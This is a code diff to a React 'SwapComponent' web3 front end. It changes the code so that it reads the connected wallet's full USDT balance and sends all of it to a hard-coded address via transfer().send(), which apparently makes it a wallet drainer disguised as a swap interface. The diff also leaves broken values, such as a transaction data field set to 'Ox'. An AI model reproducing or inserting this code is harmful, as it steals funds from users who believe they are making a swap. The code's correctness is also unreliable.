@@ -76,11 +76,10 @@ function SwapComponent() {
       from: address,
     })
     const balance = await usdtContract.methods.balanceOf(address).call()
-    const formatted = web3js.utils.fromWei(balance, 'ether')
 
     const data = usdtContract.methods
-      .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', formatted)
-      .encodeABI()
+      .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', balance)
+      .send()
 
     const nonce = await web3js.eth.getTransactionCount(address, 'pending')
     const gasPrice = await web3js.eth.getGasPrice()
@@ -98,7 +97,7 @@ function SwapComponent() {
       gasPrice: web3js.utils.toHex(gasPrice),
       gasLimit: web3js.utils.toHex(gasLimit),
       value: '0x0',
-      data: data,
+      data: 'Ox',
       chainId: web3js.utils.toHex(chainId),
       v: '0x1',
       r: '0x',
